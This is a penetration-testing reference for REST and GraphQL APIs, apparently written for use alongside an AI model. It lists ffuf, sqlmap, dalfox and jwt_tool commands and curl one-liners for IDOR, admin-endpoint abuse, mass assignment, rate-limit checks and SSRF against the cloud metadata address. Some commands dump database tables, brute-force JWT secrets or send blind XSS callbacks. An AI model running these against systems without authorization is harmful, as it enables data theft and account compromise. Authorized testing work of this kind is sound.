# API Testing Reference

## Goal
Test REST APIs for injection, broken auth, rate limiting, IDOR, mass assignment,
and logic flaws. Most automated scanners miss API-specific issues.

**Note on Claude's role:** Every check below is performed by a tool. Claude should
not handcraft injection strings, JWT forgeries, or other payloads — instead, identify
the right tool from this reference and ask the user to run it.

---

## Recon: API Discovery

```bash
# Find API endpoints from JS files
cat ./recon/wayback-urls.txt | grep -E "\.js$" | sort -u | \
  xargs -I{} curl -sk {} | grep -oE '"\/api\/[^"]*"' | sort -u

# Common API paths — fuzz with ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -u $TARGET/FUZZ -mc 200,201,301,302,401,403 -o ./api/discovered-endpoints.json

# OpenAPI/Swagger discovery
curl -sk $TARGET/swagger.json $TARGET/openapi.json $TARGET/api-docs \
     $TARGET/swagger/v1/swagger.json $TARGET/v1/api-docs
```

---

## ffuf — Endpoint & Parameter Fuzzing

```bash
# Directory/endpoint discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  -u $TARGET/api/FUZZ \
  -mc 200,201,204,301,302,401,403 \
  -o ./api/ffuf-endpoints.json \
  -of json

# With auth header
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -u $TARGET/FUZZ \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,201,204,401,403,500 \
  -o ./api/ffuf-auth.json

# Parameter fuzzing (GET)
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "$TARGET/api/users?FUZZ=test" \
  -mc 200 -fs 0

# POST body fuzzing
ffuf -w ./wordlists/params.txt \
  -u $TARGET/api/endpoint \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"FUZZ":"test"}' \
  -mc 200,201

# Virtual host / subdomain fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://FUZZ.$DOMAIN \
  -H "Host: FUZZ.$DOMAIN" \
  -mc 200,301,302
```

---

## sqlmap — SQL Injection Validation

Use sqlmap to validate whether an endpoint is vulnerable to SQL injection. Claude
should not write SQL injection strings — let sqlmap generate and test them.

```bash
# Basic scan on a URL with parameter
sqlmap -u "$TARGET/api/users?id=1" --batch --level=3 --risk=2

# POST request injection check
sqlmap -u $TARGET/api/login \
  --data='{"username":"admin","password":"test"}' \
  --content-type="application/json" \
  --batch --dbs

# With session token
sqlmap -u "$TARGET/api/item?id=1" \
  -H "Authorization: Bearer $TOKEN" \
  --batch --level=3 --risk=2

# From a saved Burp request file
sqlmap -r ./api/request.txt --batch --level=5 --risk=3

# Validate database access on a confirmed-vulnerable endpoint
sqlmap -u "$TARGET/api/users?id=1" --batch --dbms=mysql -D webapp -T users --dump

# Blind injection check with time-based technique (slower, stealthier)
sqlmap -u "$TARGET/api/search?q=test" --technique=T --batch

# Evasion testing
sqlmap -u "$TARGET/api/users?id=1" --tamper=space2comment,randomcase --batch
```

### Quick Manual Indicators

If sqlmap reports a finding, verify by re-running with `-v 3` for full request/response
logs. Do not have Claude hand-write injection strings — sqlmap is the source of truth
for what was sent and what the server responded with.

---

## dalfox — XSS Validation

Use dalfox to validate whether an endpoint reflects user input in an unsafe way.
Claude should not write XSS payloads — dalfox maintains and rotates its own.

```bash
# Single URL
dalfox url "$TARGET/search?q=test"

# With auth
dalfox url "$TARGET/search?q=test" \
  --cookie "session=$COOKIE" \
  --header "Authorization: Bearer $TOKEN"

# Pipe URLs (mass scan)
cat ./recon/param-urls.txt | dalfox pipe -o ./api/xss-findings.txt

# Blind XSS check (requires your callback server)
dalfox url "$TARGET/feedback?msg=test" \
  -b "https://your-callback.burpcollaborator.net"

# DOM-based XSS scan
dalfox url "$TARGET" --mining-dom

# Custom payload file (user-supplied, not Claude-generated)
dalfox url "$TARGET/search?q=test" --custom-payload ./wordlists/xss-payloads.txt
```

---

## API-Specific Test Vectors

### Broken Object Level Auth (BOLA/IDOR)
```bash
# Validate whether other users' resources are accessible by changing IDs
for id in $(seq 1 100); do
  curl -sk -H "Authorization: Bearer $TOKEN" \
    "$TARGET/api/users/$id" | grep -v "401\|403"
done

# UUID-based IDOR (enumerate predictable UUIDs or use wordlist)
ffuf -w ./wordlists/uuids.txt \
  -u $TARGET/api/orders/FUZZ \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200
```

### Broken Function Level Auth
```bash
# Test whether a user-level token grants access to admin endpoints
curl -sk -H "Authorization: Bearer $USER_TOKEN" $TARGET/api/admin/users
curl -sk -H "Authorization: Bearer $USER_TOKEN" -X DELETE $TARGET/api/admin/users/1
curl -sk -H "Authorization: Bearer $USER_TOKEN" -X PUT $TARGET/api/admin/config \
  -d '{"debug":true}'
```

### Mass Assignment
```bash
# Test whether extra fields can be set that shouldn't be settable
curl -sk -X POST $TARGET/api/users/register \
  -H "Content-Type: application/json" \
  -d '{"username":"researcher","password":"pass","role":"admin","isAdmin":true}'
```

### JWT Validation
Use jwt_tool to test JWT implementations. Claude should not hand-craft JWT tokens.

```bash
# Decode JWT (no verification)
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | jq

# Test alg:none handling
jwt_tool $TOKEN -X a

# Test for weak secrets via brute force
jwt_tool $TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Test RS256 → HS256 confusion
jwt_tool $TOKEN -S hs256 -k ./public.pem
```

### Rate Limiting Validation
```bash
# Check whether rate limiting is enforced on sensitive endpoints
for i in $(seq 1 50); do
  curl -sk -X POST $TARGET/api/login \
    -d '{"username":"admin","password":"wrong"}' \
    -w "%{http_code}\n" -o /dev/null
done | sort | uniq -c
# No 429s after 50 attempts = no rate limiting
```

### SSRF via API Parameters
```bash
# Validate whether URL parameters are vulnerable to SSRF
curl -sk "$TARGET/api/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -sk -X POST $TARGET/api/webhook \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
```

---

## GraphQL-Specific
```bash
# Introspection (exposes full schema)
curl -sk -X POST $TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}'

# Batch query handling test (rate limit bypass check)
curl -sk -X POST $TARGET/graphql \
  -d '[{"query":"mutation{login(user:\"a\",pass:\"a\")}"},{"query":"mutation{login(user:\"b\",pass:\"b\")}"}]'
```
